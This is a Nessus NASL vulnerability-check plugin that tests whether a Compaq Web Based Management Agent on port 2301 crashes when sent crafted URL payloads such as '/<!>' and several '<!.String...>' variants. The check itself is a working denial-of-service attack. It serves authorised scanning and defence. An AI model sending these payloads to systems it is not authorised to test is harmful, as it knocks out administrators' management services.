# Copyright 2003 by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence - GPLv2
#
# References:
#
# Message-ID: <1003117.1055973914093.JavaMail.SYSTEM@sigtrap>
# Date: Thu, 19 Jun 2003 00:05:14 +0200 (CEST)
# From: Ian Vitek <ian.vitek@as5-5-7.bi.s.bonet.se>
# To: <vuln-dev@securityfocus.com>
# Subject: SSI vulnerability in Compaq Web Based Management Agent
#

if(description)
{
 script_id(11980);
 script_version ("$Revision: 1.3 $");

 name["english"] = "Compaq Web SSI DoS";
 script_name(english:name["english"]);

desc["english"] = "
It was possible to kill the remote web server by requesting
something like: /<!>
This is probably a Compaq Web Enterprise Management server.

A cracker might use this flaw to forbid you from managing your machines.

Risk :	High
Solution : 	contact your vendor for a patch, 
		or disable this service if you do not use it.";

 script_description(english:desc["english"]);

 summary["english"] = "<!> crashes Compaq Web Management Agent";
 script_summary(english:summary["english"]);

 script_category(ACT_DENIAL);

 script_copyright(english:"This script is Copyright (C) 2004 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais: family["francais"]);

 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 2301);
 exit(0);
}

#
include("http_func.inc");
include("misc_func.inc");
 
port = get_http_port(default:2301);
if (!port) exit(0);	# Also on 2381 - HTTPS

if (! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

# Just in case they just fix the first problem...
n = 0;
u[n++] = "/<!>";
u[n++] = "/<!.StringRedirecturl>";
u[n++] = "/<!.StringHttpRequest=Url>";
u[n++] = "/<!.ObjectIsapiECB>";
u[n++] = "/<!.StringIsapiECB=lpszPathInfo>";

for (i = 0; i < n; i ++)
{
  s = http_open_socket(port);
  if (s)
  {
    r = http_get(port: port, item: u[i]);
    send(socket: s, data: r);
    a = http_recv(socket: s);
    http_close_socket(s);
  }
}

if (http_is_dead(port: port)) security_hole(port);
